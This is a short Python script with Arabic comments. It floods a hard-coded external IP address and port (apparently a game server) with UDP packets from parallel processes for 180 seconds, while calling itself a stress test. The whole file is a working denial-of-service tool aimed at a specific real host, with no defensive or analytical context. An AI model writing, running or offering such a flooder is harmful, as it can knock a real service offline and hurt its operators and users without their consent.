import socket
import time
from multiprocessing import Process, cpu_count

# ==========================================
# إعدادات الهدف والأداء
# ==========================================
TARGET_IP = "193.233.114.200"
TARGET_PORT = 19134
DURATION = 180  # مدة التشغيل بالثواني

def udp_stress_worker(ip, port, duration):
    end_time = time.time() + duration
    payload = b"\x01\x00\x00\x00\x00\x00\x00\x00" * 8
    
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        while time.time() < end_time:
            for _ in range(20):
                sock.sendto(payload, (ip, port))
        sock.close()
    except Exception:
        pass

def main():
    workers = max(2, cpu_count())
    print(f"[*] بدء التشغيل بـ {workers} عمليات متوازية...")
    
    processes = []
    for _ in range(workers):
        p = Process(target=udp_stress_worker, args=(TARGET_IP, TARGET_PORT, DURATION))
        processes.append(p)
        p.start()
        
    for p in processes:
        p.join()
        
    print("[*] انتهى الاختبار بنجاح.")

if __name__ == '__main__':
    main()
